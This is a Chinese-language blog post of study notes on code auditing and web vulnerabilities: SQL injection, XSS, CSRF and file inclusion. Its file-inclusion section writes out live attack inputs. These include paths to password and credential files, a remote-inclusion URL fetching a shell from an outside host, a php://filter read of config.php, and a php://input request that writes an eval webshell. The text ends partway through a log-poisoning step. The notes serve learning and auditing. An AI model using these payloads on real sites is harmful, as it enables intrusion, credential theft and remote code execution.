<!DOCTYPE HTML>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    

    <title>审计以及漏洞知识点小整理 | 知秋’s blog</title>
    <meta name="author" content="知秋">
    
    <meta name="description" content="知秋">
    
    
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <meta property="og:title" content="审计以及漏洞知识点小整理"/>
    <meta property="og:site_name" content="知秋"/>

    
    <meta property="og:image" content=""/>
    

    <link rel="icon" type="image/png" href="/favicon.png">
    <link rel="alternate" href="/atom.xml" title="知秋" type="application/atom+xml">
    <link rel="stylesheet" href="/css/lib/materialize.min.css">
    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">

    
        <link rel="stylesheet" href="/css/lib/tomorrow-night-blue.min.css" type="text/css">
    
    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
</head>

<script type="text/javascript" src="../../js/love.js"></script>  

<script type="text/javascript"
color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="../../js/canvas-nest.min.js"></script>
 
  
<body style="background: url(http://p4gdp8beq.bkt.clouddn.com/background1.JPG); background-repeat: no-repeat;
  background-size: 100% 100%;">
    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
   
    <nav class="indigo">
    <div class="nav-wrapper">
        <a href="#" data-activates="main-menu" class="button-collapse">
            <i class="fa fa-navicon"></i>
        </a>
        <div class="">
            <a href="/" class="brand-logo hide-on-med-and-down">知秋</a>
            <ul class="right hide-on-med-and-down">
                
                    <li>
                        <a class="menu-home " href="/" >
                            <i class="fa fa-home "></i>
                            
                            Home
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-archive " href="/archives" >
                            <i class="fa fa-archive "></i>
                            
                            Archives
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
                            <i class="fa fa-bookmark "></i>
                            
                            Categories
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-reading " href="/reading" >
                            <i class="fa fa-book "></i>
                            
                            Reading
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-about " href="/about" >
                            <i class="fa fa-user "></i>
                            
                            About
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-search modal-trigger " href="#search" >
                            <i class="fa fa-search "></i>
                            
                            Search
                        </a>
                    </li>
                
            </ul>
            <div>
    <ul class="side-nav indigo darken-1" id="main-menu">
        
        <li class="side-user">
            <div class="row">
                <div class="col s4 no-padding">
                    <img class="avatar-image circle responsive-img" src="../../images/touxiang.jpeg" alt="User Avatar">
                </div>
                <div class="info col s8 valign-wrapper no-padding">
                    <div class="valign">
                        <p class="name">知秋</p>
                        <p class="desc">安全小白</p>
                    </div>
                </div>
            </div>
        </li>
        

        
            <li class="no-padding">
                <a class="waves-effect menu-home " href="/" >
                    <i class="fa fa-home "></i>
                    
                    Home
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-archive " href="/archives" >
                    <i class="fa fa-archive "></i>
                    
                    Archives
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
                    <i class="fa fa-bookmark "></i>
                    
                    Categories
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-reading " href="/reading" >
                    <i class="fa fa-book "></i>
                    
                    Reading
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-about " href="/about" >
                    <i class="fa fa-user "></i>
                    
                    About
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-search modal-trigger " href="#search" >
                    <i class="fa fa-search "></i>
                    
                    Search
                </a>
            </li>
        
    </ul>

    <ul class="side-nav indigo darken-1" id="category-menu">
    

            

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/essay/">
                    essay <span class="right">5</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/ctf/">
                    ctf <span class="right">12</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/ctf/web/">
                    web <span class="right">11</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/ctf/writeup/">
                    writeup <span class="right">1</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/knowledge/">
                    knowledge <span class="right">12</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/knowledge/note/">
                    note <span class="right">8</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/knowledge/crypt/">
                    crypt <span class="right">1</span></a>
                </a>
            </li>

        

            <li class="collapse-level-1" collapse-level="1">
                <a class="no-padding" href="/categories/knowledge/vulnerability/">
                    vulnerability <span class="right">3</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/life/">
                    life <span class="right">3</span></a>
                </a>
            </li>

        

    </ul>
</div>

        </div>
    </div>
</nav>

<div id="search" class="modal search-modal">
    <div class="row">
        <div class="input-field col s12">
              <input id="search-input" type="text">
              <label for="search-input">Search</label>
        </div>

    </div>
    <div id="search-result" class="search-result col s12">

    </div>
</div>



    <main>
        <div class="container main-container">
    <nav class="page-nav hide-on-small-only">
    <div class="nav-wrapper indigo">
        <span class="breadcrumb">Current page(Categories)</span>
        
            
    
    
    <a class="breadcrumb" href="/categories/knowledge/">knowledge</a><a class="breadcrumb" href="/categories/knowledge/note/">note</a>


        

        
    </div>
</nav>

<article>
    <div class="card">
        <div class="card-content">
            

            <div class="article-title">
                
    
        <h1>审计以及漏洞知识点小整理</h1>
    


            </div>
            <time class="pink-link-context" datetime="2018-03-17T06:54:00.000Z"><a href="/posts/8a554d22.html">2018-03-17</a></time>

            <span id="busuanzi_container_page_pv" class="read-times-container">
    <i class="fa fa-eye"></i>
    <span id="busuanzi_value_page_pv"></span>
</span>

            
    <div class="tags-row">
        
            <a href="/tags/knowledeg/" class="chip pink lighten-1">knowledeg</a>
        
            <a href="/tags/node/" class="chip pink lighten-1">node</a>
        
    </div>


            <div class="toc pink-link-context hide-on-med-and-down">
    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#通用代码审计思路"><span class="section table-of-contents-text">通用代码审计思路</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#1-敏感函数回溯参数"><span class="section table-of-contents-text">1.敏感函数回溯参数</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#2通读全文代码。"><span class="section table-of-contents-text">2通读全文代码。</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#3-根据功能点定向审计"><span class="section table-of-contents-text">3.根据功能点定向审计</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#sql注入漏洞"><span class="section table-of-contents-text">sql注入漏洞</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#1-常见的函数"><span class="section table-of-contents-text">1.常见的函数</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#2-常见注入"><span class="section table-of-contents-text">2.常见注入</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#3-编码注入"><span class="section table-of-contents-text">3.编码注入</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#4-sql注入防御"><span class="section table-of-contents-text">4.sql注入防御</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#sql注入的一些绕过技巧"><span class="section table-of-contents-text">sql注入的一些绕过技巧</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#xss漏洞"><span class="section table-of-contents-text">xss漏洞</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#1-xss类型"><span class="section table-of-contents-text">1.xss类型</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#2-xss的利用"><span class="section table-of-contents-text">2.xss的利用</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#3-xss的构造"><span class="section table-of-contents-text">3.xss的构造</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#4-xss的防御"><span class="section table-of-contents-text">4.xss的防御</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#CSRF"><span class="section table-of-contents-text">CSRF</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#1-csrf的攻击和防御"><span class="section table-of-contents-text">1.csrf的攻击和防御</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#文件操作漏洞"><span class="section table-of-contents-text">文件操作漏洞</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#1-文件包含漏洞"><span class="section table-of-contents-text">1.文件包含漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#2-文件读取漏洞"><span class="section table-of-contents-text">2.文件读取漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#3-文件上传漏洞"><span class="section table-of-contents-text">3.文件上传漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#4-文件解析漏洞"><span class="section table-of-contents-text">4.文件解析漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#5-文件删除漏洞"><span class="section table-of-contents-text">5.文件删除漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#6-目录遍历漏洞"><span class="section table-of-contents-text">6.目录遍历漏洞</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#代码执行漏洞"><span class="section table-of-contents-text">代码执行漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#命令执行漏洞"><span class="section table-of-contents-text">命令执行漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#变量覆盖漏洞"><span class="section table-of-contents-text">变量覆盖漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#逻辑处理漏洞"><span class="section table-of-contents-text">逻辑处理漏洞</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#1-等于与存在判断绕过"><span class="section table-of-contents-text">1.等于与存在判断绕过</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#2-越权访问"><span class="section table-of-contents-text">2.越权访问</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#3-支付漏洞"><span class="section table-of-contents-text">3.支付漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#4-密码重置漏洞"><span class="section table-of-contents-text">4.密码重置漏洞</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#会话认证漏洞"><span class="section table-of-contents-text">会话认证漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#点击劫持"><span class="section table-of-contents-text">点击劫持</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#ssrf"><span class="section table-of-contents-text">ssrf</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#代码注入"><span class="section table-of-contents-text">代码注入</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#1-xml外部实体注入"><span class="section table-of-contents-text">1.xml外部实体注入</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#2-xpath注入"><span class="section table-of-contents-text">2.xpath注入</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#3-jsonp注入"><span class="section table-of-contents-text">3.jsonp注入</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#加密算法与随机数"><span class="section table-of-contents-text">加密算法与随机数</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#1-Stream-Ciper-Attack"><span class="section table-of-contents-text">1.Stream Ciper Attack</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#2-ECB模式缺陷"><span class="section table-of-contents-text">2.ECB模式缺陷</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#3-Padding-Oracle-Attack"><span class="section table-of-contents-text">3.Padding Oracle Attack</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#4-伪随机数问题"><span class="section table-of-contents-text">4.伪随机数问题</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#5-Length-Extension-Attack"><span class="section table-of-contents-text">5.Length Extension Attack</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#DDOS攻击"><span class="section table-of-contents-text">DDOS攻击</span></a></li></ol>
</div>


            <div class="entry pink-link-context">
                <p>趁着这几天清闲，整理一下常见漏洞的知识，既是给自己梳理一下知识体系，也是给自己留个备忘录，省得记忆差，老是忘却。大都是从书本上搬运而来的，整理不佳，大牛略过，勿喷。</p>
<a id="more"></a> 
<p>别人的php代码审计知识脑图<br><img src="/posts/../../images/naotu/PHP.png" alt=""></p>
<h1 id="通用代码审计思路"><a href="#通用代码审计思路" class="headerlink" title="通用代码审计思路"></a>通用代码审计思路</h1><h2 id="1-敏感函数回溯参数"><a href="#1-敏感函数回溯参数" class="headerlink" title="1.敏感函数回溯参数"></a>1.敏感函数回溯参数</h2><p>1敏感函数<br>2非敏感函数:<br> sql查询语句拼接前是否有过滤。<br>查找关键特征：select、insert、update等，结合from、where。<br>寻找漏洞：<br>sql语句中的参数是否有过滤。<br>例如：HTTP_CLIENT_IP和HTTP_X_FORWORDF等获取的ip地址。</p>
<h2 id="2通读全文代码。"><a href="#2通读全文代码。" class="headerlink" title="2通读全文代码。"></a>2通读全文代码。</h2><p>1.函数集文件，通常命名为functions或者common等关键字，提供其他文件调用的公共函数。<br>2.配置文件。通常命名包含config关键字，包括web程序运行必须的功能性配置选项以及数据库等配置信息。<br>3安全过滤文件。通常命名中有filter、safe、check等关键字，对参数进行过滤，入sql注入和xss过滤,文件路径和执行的系统命令 的参数。<br>4index文件，可以大致了解整个程序的框架和运行的流程、包含到的文件、其中的核心文件。   </p>
<h2 id="3-根据功能点定向审计"><a href="#3-根据功能点定向审计" class="headerlink" title="3.根据功能点定向审计"></a>3.根据功能点定向审计</h2><p>3.1文件上传功能。如文章编辑、资料编辑、头像上传、附件上传，经常出现任意文件上传漏洞。如果没有对文件名进行过滤，还可能存在sql注入。<br>3.2文件管理。 文件名和路径如果直接在参数中传递，可能存在任意文件操作漏洞，利用../或..\跳转。忽略对文件名过滤，还可能存在xss漏洞。<br>3.3登入认证功能。基于cookie和session认证方式，如果cookie没有加salt,可以导致任意文件登入。或者用户名明文直接放在cookie，导致越权漏洞。<br>3.4找回密码功能。</p>
<h1 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/SQL%20%E6%B3%A8%E5%85%A5/MYSQL%E6%B3%A8%E5%85%A5.md" target="_blank" rel="noopener">sql注入漏洞</a></h1><h2 id="1-常见的函数"><a href="#1-常见的函数" class="headerlink" title="1.常见的函数"></a>1.常见的函数</h2><p>mid()—从文本字段中提取字符SELECT   MID(column_name,start[,length]) FROM table_name;<br>column_name 必需。要提取字符的字段。<br>start 必需。规定开始位置（起始值是 1）。<br>length 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。   </p>
<p>limit()—返回前几条或者中间某几行数据select * from table limit m,n;<br>其m指记录始index0始表示第条记录 n指第m+1条始取n条   </p>
<p>concat、concat_ws、group_concatMySQL的concat函数在连接字符串的 时候，只要其中一个是NULL,那么将返回NULL<br>和concat不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL<br>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])   </p>
<p>Count()—聚集函数，统计元祖的个数<br>rand()—用于产生一个0~1的随机数<br>floor()—向下取整<br>group by—依据我们想要的规则对结果进行分组<br>length()—返回字符串的长度<br>Substr()—截取字符串 三个参数 （所要截取字符串，截取的位置，截取的长度）<br>sleep() 函数延迟代码执行若干秒。  </p>
<h2 id="2-常见注入"><a href="#2-常见注入" class="headerlink" title="2.常见注入"></a>2.常见注入</h2><p>1 <a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">limit注入</a><br>2<a href="https://www.waitalone.cn/security-sqlinject-jpg.html" target="_blank" rel="noopener">图片宽字节注入</a><br>3<a href="http://cfyqy.com/posts/53139f85/" target="_blank" rel="noopener">cookie注入</a><br>4post注入<br>5<a href="http://hacker-chengyu.lofter.com/post/1d1568f4_d192dc5" target="_blank" rel="noopener">报错注入</a><br>6<a href="http://www.jb51.net/article/93445.htm" target="_blank" rel="noopener">布尔盲注</a><br>7时间盲注<br>8<a href="http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/" target="_blank" rel="noopener">二次注入</a><br>9<a href="http://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html" target="_blank" rel="noopener">order by 注入</a><br>10<a href="http://cfyqy.com/posts/90656973/" target="_blank" rel="noopener">密码注入</a><br>11<a href="https://ch1st.github.io/2017/10/19/Mysql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">mysql约束攻击</a><br>12<a href="http://blog.csdn.net/greyfreedom/article/details/45846137" target="_blank" rel="noopener">md5加密注入</a><br>13<a href="https://www.anquanke.com/post/id/86021" target="_blank" rel="noopener">mysql失败注入</a><br>14 header 注入<br>15 二次查询注入<br>16update或insert注入<br> <a href="http://vinc.top/2017/04/06/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91insert%E3%80%81update%E5%92%8Cdelete%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">insert、update和delete报错注入</a><br> <a href="http://vinc.top/2017/04/06/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91insert%E3%80%81update%E5%92%8Cdelete%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">insert、update和delete时间盲注</a><br> <a href="https://www.anquanke.com/post/id/85487" target="_blank" rel="noopener">一种新的MySQL下Update、Insert注入方法</a><br> 17<a href="https://www.jianshu.com/p/19ef493da938" target="_blank" rel="noopener">SQL带外通道注入</a> </p>
<h2 id="3-编码注入"><a href="#3-编码注入" class="headerlink" title="3.编码注入"></a>3.编码注入</h2><p>1<a href="https://mp.weixin.qq.com/s/Gu9MTBhZryUrPSAj4GpYDg" target="_blank" rel="noopener">宽字节注入注入</a><br>当<code>set character_set_client=gbk</code> 时，很容易存在宽字节注入<br>防范方法3种:<br>a. 在执行查询之前先执行<code>SET NAMES &#39;gbk&#39;,charset_set_client=binary</code>。<br>b.使用<code>mysql_set_charset(&#39;gdk&#39;)</code>设置编码，然后使用<code>mysql_real_escape_string()</code>函数被参数过滤。<br>c.使用pdo方式，在php5.3.6及一下版本需要设置<code>setAttribute(PDO::ATTR_EMULATE_PREPARES,false)</code>; 来禁用<code>prepared statements</code>的仿真效果。<br>2二次urldecode注入<br>利用urldecode和rawurldecode函数使用不当   </p>
<h2 id="4-sql注入防御"><a href="#4-sql注入防御" class="headerlink" title="4.sql注入防御"></a>4.sql注入防御</h2><p>1.gpc/runtime魔术引号<br>magic_quotes_gpc 负责对GET、POST、COOKIE的值进行过滤。<br>magic_quotes_runtime负责对从数据库后者文件中获取的数据进行过滤。<br>启用： php4.2.3可以在配置文件和代码的任意地方启用。之后在php.ini、httpd.conf以及.htaccess中开启。<br>2.过滤函数<br>addslashes 和gpc过滤的值一样，即‘、‘’、\、null<br>mysql_[real_]escape_string 函数 ,即\x00、\n、 \r 、\ 、’ 、’’、 \xla  都是对字符串进行过滤，php4.03以上版本才存在。<br>intval等字符转换。<br>3.PDO prepare预编译   </p>
<h2 id="sql注入的一些绕过技巧"><a href="#sql注入的一些绕过技巧" class="headerlink" title="sql注入的一些绕过技巧"></a>sql注入的一些绕过技巧</h2><p>这里有几篇不错的文章<br><a href="https://www.anquanke.com/post/id/85936" target="_blank" rel="noopener">sql注入与防御</a><br><a href="https://www.anquanke.com/post/id/86005" target="_blank" rel="noopener">SQL注入防御与绕过的几种姿势</a><br><a href="http://www.myh0st.cn/index.php/archives/883/" target="_blank" rel="noopener">PHP+Mysql注入防护与绕过</a></p>
<h1 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h1><p>跨站脚本攻击（Cross Site Scriptings）,嵌入客户端的恶意脚本代码  ，xss可以盗取用户cookie、黑道网页、改变网页内容。<br>审计时寻找没有被过滤的参数，且这些参数传入到输出函数，关键字：print、print_r、echo、printf、sprintf、die、var_dump、var_export。   </p>
<h2 id="1-xss类型"><a href="#1-xss类型" class="headerlink" title="1.xss类型"></a>1.xss类型</h2><p>1.<a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%8F%8D%E5%B0%84XSS.md" target="_blank" rel="noopener">反射性xss</a><br>简单的把用户输入的数据反射给游览器，需要诱使用户点击一个恶意链接，才能成功，非持久性。<br>2.<a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%AD%98%E5%82%A8XSS.md" target="_blank" rel="noopener">存储性xss</a><br>把用户输入的数据存储在服务器。<br>3.<a href="https://security.tencent.com/index.php/blog/msg/107" target="_blank" rel="noopener">DOMxss</a><br>实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分的，从效果上来说也是反射型XSS单独划分出来的，因为DOM Based XSS 的形成原因比较特别。这是由于客户端脚本自身解析不正确导致的安全问题。   </p>
<h2 id="2-xss的利用"><a href="#2-xss的利用" class="headerlink" title="2.xss的利用"></a>2.xss的利用</h2><p>1.xss payload<br>构造get和post请求<br>xss钓鱼<br>识别用户的游览器<br>识别用户安装的软件<br>css History Hack<br>获取用户的真实ip<br>2.xss  Framework<br>attacke api<br>beff<br>xss-proxy<br>3.xss  worm   </p>
<h2 id="3-xss的构造"><a href="#3-xss的构造" class="headerlink" title="3.xss的构造"></a>3.xss的构造</h2><p><a href="http://www.freebuf.com/articles/web/20282.html" target="_blank" rel="noopener">XSS现代WAF规则探测及绕过技术</a><br><a href="http://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a>     </p>
<h2 id="4-xss的防御"><a href="#4-xss的防御" class="headerlink" title="4.xss的防御"></a>4.xss的防御</h2><p><a href="http://www.freebuf.com/articles/web/9977.html" target="_blank" rel="noopener">防御XSS的七条原则</a><br><a href="https://juejin.im/entry/58a598dc570c35006b5cd6b4" target="_blank" rel="noopener">XSS 攻击和防御详解</a><br>附上一篇前端<a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md" target="_blank" rel="noopener">解码顺序</a></p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/CSRF.md" target="_blank" rel="noopener">CSRF</a></h1><p>Cross_site request forgery（跨站请求伪造）<br>当我们打开或者登入某个网站后，游览器与网站所存放的服务器将会产生一个会话，在这个会话没有结束时，你就可以利用你的权限对网站进行某些操作。  </p>
<h2 id="1-csrf的攻击和防御"><a href="#1-csrf的攻击和防御" class="headerlink" title="1.csrf的攻击和防御"></a>1.csrf的攻击和防御</h2><p><a href="http://www.freebuf.com/column/153543.html" target="_blank" rel="noopener">白帽子挖洞—跨站请求伪造（CSRF）篇</a><br><a href="http://www.freebuf.com/column/151816.html" target="_blank" rel="noopener">各大SRC中的CSRF技巧</a><br><a href="https://www.leavesongs.com/PENETRATION/think-about-cookie-form-csrf-protected.html" target="_blank" rel="noopener">Cookie-Form型CSRF防御机制的不足与反思</a>   </p>
<h1 id="文件操作漏洞"><a href="#文件操作漏洞" class="headerlink" title="文件操作漏洞"></a>文件操作漏洞</h1><h2 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a>1.<a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.md" target="_blank" rel="noopener">文件包含漏洞</a></h2><p> 1.php包含函数：<br> require: 找不到被包含的函数产生致命错误（E_COMPILE_ERROR）,并停止脚本<br> include: 找不到被包含的文件时只会产生警告（E_WARNING），脚本将继续执行<br> include_once:和include类似，包含一次，则不会再包含<br> require_once: 和require类似，包含一次，则不会再包含</p>
<p> 本地文件包含   </p>
<p> 远程文件包含<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">allow_url_include= off //把off更改为on</span><br></pre></td></tr></table></figure></p>
<p> 2.文件包含漏洞利用<br> (1)常见敏感信息路径<br>  window系统<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c:\boot.ini    //查看系统版本       </span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml //iis配置文件</span><br><span class="line">c:\windows\repair\sam  //存储windwos系统初次安装的密码</span><br><span class="line">c:\Program Files\mysql\my.ini  //mysql配置</span><br><span class="line">c:\Program Files\mysql\data\mysql\user.MYD //mysql root</span><br><span class="line">c:\windows\php.ini       //php配置文件</span><br></pre></td></tr></table></figure></p>
<p> UNIX/Linux系统<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/passwd   //账户密码</span><br><span class="line">/usr/<span class="built_in">local</span>/app/apache2/conf/httpd.comf //apache2默认配置文件</span><br><span class="line">/usr/<span class="built_in">local</span>/app/apache2/conf/extra/httpd-vhosts.conf  //虚拟网站设置</span><br><span class="line">/usr/<span class="built_in">local</span>/app/php5/lib/php.ini //php相关设置</span><br><span class="line">/etc/httpd/conf/httpd.conf  //apache配置文件</span><br><span class="line">/etc/my.cnf  //mysql配置文件</span><br></pre></td></tr></table></figure></p>
<p> （2）远程包含shell<br> 当目标主机allow_url_fopen选项是on,就可以远程包含一句话</p>
<p> <a href="http://cfyqy.com/index.php?page=http://www.qianye.com/shell.txt" target="_blank" rel="noopener">http://cfyqy.com/index.php?page=http://www.qianye.com/shell.txt</a> </p>
<p> (3)本地包含配合文件上传。<br> 上传一句话图片木马到目标网站服务器，再包含该图片。<br> (4)使用<a href="https://lorexxar.cn/2016/09/14/php-wei/" target="_blank" rel="noopener">php封装协议</a>    </p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file://          访问本地文件系统</span><br><span class="line">http://          访问http(s)网址</span><br><span class="line">ftp://           访问ftp(s)urls</span><br><span class="line">php://           访问输入/输出流  </span><br><span class="line">zlib://          压缩流   </span><br><span class="line">data://          数据流   </span><br><span class="line">sshs://          Secure Shell2 </span><br><span class="line">expect://        处理交互式的流  </span><br><span class="line">glob://          查找匹配文件路径</span><br></pre></td></tr></table></figure>
<p> 使用封装协议可以读取php文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://cfyqy.com/index.php?page=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure></p>
<p>写入php文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://cfyqy.com/index.php?page=php://input   </span><br><span class="line"></span><br><span class="line">post：&lt;?fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php eval(<span class="variable">$_POst</span>['qianye']);?&gt;"</span>?&gt;</span><br></pre></td></tr></table></figure></p>
<p>  (5）包含apache 日志文件<br> 访问<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://cfyqy.com/&lt;?php  phpinfo();?&gt;</span><br></pre></td></tr></table></figure></p>
